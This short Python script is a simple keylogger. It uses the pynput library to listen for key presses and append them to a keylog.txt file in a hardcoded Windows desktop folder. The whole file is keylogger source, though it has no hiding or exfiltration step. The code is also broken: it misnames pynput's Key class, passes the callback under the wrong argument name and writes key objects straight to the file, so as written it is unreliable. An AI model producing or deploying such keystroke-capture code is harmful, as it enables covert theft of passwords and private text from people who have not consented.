from pynput import keyboard

log = 'keylog.txt'
path = "C:\\Users\\HP\\Desktop\\ACM"
add = '\\'

key = ''

def tofile(key):
    with open(path + add + log, "a") as file:
        if key == keyboard.key.enter:
            file.write("\n")
            file.close()
        elif key == keyboard.key.space:
            file.write(' ')
            file.close()
        else:
            file.write(key)
            file.close()

with keyboard.Listener(tofile = tofile) as listener:
    listener.join()
